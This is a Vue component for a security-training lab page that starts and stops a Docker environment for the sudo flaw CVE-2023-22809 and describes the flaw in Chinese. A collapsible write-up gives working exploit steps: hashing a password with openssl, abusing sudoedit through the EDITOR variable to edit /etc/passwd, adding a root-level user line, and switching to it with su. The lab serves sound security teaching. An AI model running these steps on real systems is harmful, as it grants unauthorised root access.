<script setup>

import { ref, onMounted } from 'vue';

const isLoading = ref({
    test1: false,
    test2: false,
});
const imagePath = ref('');

// 从本地存储中获取初始状态
const Sudo_DockerComposeUp = ref(localStorage.getItem('Sudo_DockerComposeUp') === 'true');
const Sudo_test2Up = ref(localStorage.getItem('Sudo_test2Up') === 'true');

const test1 = 'CVE-2023-22809';
const test2 = 'test_2';

const toggleDockerCompose = async (directory) => {
    try {
        isLoading.value[directory] = true;

        if (directory === test1) {

            if (Sudo_DockerComposeUp.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);
            }

            Sudo_DockerComposeUp.value = !Sudo_DockerComposeUp.value;

            // 存储按钮状态
            localStorage.setItem('Sudo_DockerComposeUp', Sudo_DockerComposeUp.value);
        }

        // test2
        if (directory === test2) {

            if (Sudo_test2Up.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);
            }
            // Sudo_test2Up.value = !Sudo_test2Up.value;

            // localStorage.setItem('Sudo_test2Up', Sudo_test2Up.value);
        }

    } catch (error) {

        console.error('Error toggling Docker Compose:', error);
        // 启动或停止环境失败时将对应按钮状态设置回默认状态
        if (directory === test1) {
            Sudo_DockerComposeUp.value = false;
        } else if (directory === test2) {
            Sudo_test2Up.value = false;
        }

    } finally {

        isLoading.value[directory] = false;

        // 存储按钮状态
        if (directory === test1) {
            localStorage.setItem('Sudo_DockerComposeUp', Sudo_DockerComposeUp.value);
        } else if (directory === test2) {
            localStorage.setItem('Sudo_test2Up', Sudo_test2Up.value);
        }

    }
};

const startEnvironment = async (directory) => {
    try {
        // await axios.post('/startEnvironment', { directory });
        const response = await axios.post('/startEnvironment', { directory });
        imagePath.value = response.data.imagePath;
    } catch (error) {
        console.error('Error starting environment:', error);
    }
};

const stopEnvironment = async (directory) => {
    try {
        await axios.post('/stopEnvironment', { directory });
    } catch (error) {
        console.error('Error stopping environment:', error);
    }
};

onMounted(() => {
    // 组件加载后从本地存储中恢复按钮状态
    Sudo_DockerComposeUp.value = localStorage.getItem('Sudo_DockerComposeUp') === 'true';
    Sudo_test2Up.value = localStorage.getItem('Sudo_test2Up') === 'true';
});

</script>


<template>
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Sudo Privilege Escalation Environment</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><router-link to="/admin/home">Home</router-link></li>
                        <li class="breadcrumb-item"><a href="#">Sudo Privilege Escalation</a></li>
                        <li class="breadcrumb-item active">Sudo Privilege Escalation Environment</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>


    <div class="content">
        <div class="container-fluid">
            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-22809 sudo提权漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">
                        Sudo提权漏洞，漏洞信息为：在低于 1.9.12p2 的 Sudo 中，sudoedit功能错误地处理了在用户提供的环境变量（SUDO_EDITOR、VISUAL 和
                        EDITOR）中传递的额外参数，从而允许本地攻击者将任意条目追加到要处理的文件列表中，最终实现权限升级。
                    </p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">sudo 1.8.0-sudo 1.9.12p1(sudo>=1.8.0 or sudo &lt;=1.9.12p1)
                        Wuzhicms &lt;= v4.1.0</p>

                    <button @click="toggleDockerCompose(test1)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="Sudo_DockerComposeUp ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[test1]">
                        <div v-if="isLoading[test1]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ Sudo_DockerComposeUp ? '关闭环境' : '启动环境' }}</span>
                    </button>
                    <div v-if="Sudo_DockerComposeUp && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>

                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">
                        <!-- Collapse Button -->
                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>
                    <!-- /.card-tools -->
                </div>
                <!-- /.card-header -->
                <div class="card-body">
                    <h5 class="title">openssl passwd -1 -salt mky 123</h5>
                    <img src="/images/sudo.png" style="max-width: 80%; height: auto;">
                    <h5 class="title">EDITOR='vim -- /etc/passwd' sudoedit /etc/test
                        <p class="card-text">------------- 修改/etc/passwd ------------------
                        </p>

                    </h5>
                    <p class="card-text">mky:$1$mky$QUlTAWGU0mlv9Sj/yPLOu.:0:0:root:/root:/bin/bash
                    </p>
                    <h5 class="title">su mky
                    </h5>

                    <img src="/images/sudo1.png" style="max-width: 80%; height: auto;">

                </div>

            </div>

        </div>
    </div>
</template>